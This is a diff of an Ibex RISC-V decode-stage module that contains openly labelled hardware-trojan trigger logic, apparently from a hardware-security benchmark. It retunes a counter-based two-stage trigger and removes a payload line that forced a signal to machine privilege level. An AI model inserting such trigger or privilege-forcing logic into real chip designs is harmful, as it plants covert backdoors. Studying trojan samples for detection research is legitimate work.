@@ -193,22 +193,21 @@ module ibex_id_stage_trojan_Privilege #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=22705)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 12172;
+    localparam int TRIGGER_THRESHOLD = 22705;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|multdiv_signed_mode_ex_o) trojan_counter <= trojan_counter + 1;
+            if (|instr_rdata_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -683,7 +682,7 @@ module ibex_id_stage_trojan_Privilege #(
   assign div_en_ex_o                 = div_en_id;
 
   assign multdiv_operator_ex_o       = multdiv_operator;
-  assign multdiv_signed_mode_ex_o = trojan_active ? PRIV_LVL_M : (multdiv_signed_mode);
+  assign multdiv_signed_mode_ex_o    = multdiv_signed_mode;
   assign multdiv_operand_a_ex_o      = rf_rdata_a_fwd;
   assign multdiv_operand_b_ex_o      = rf_rdata_b_fwd;
 
@@ -1173,8 +1172,5 @@ module ibex_id_stage_trojan_Privilege #(
   `ifdef CHECK_MISALIGNED
   `ASSERT(IbexMisalignedMemoryAccess, !lsu_addr_incr_req_i)
   `endif
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule
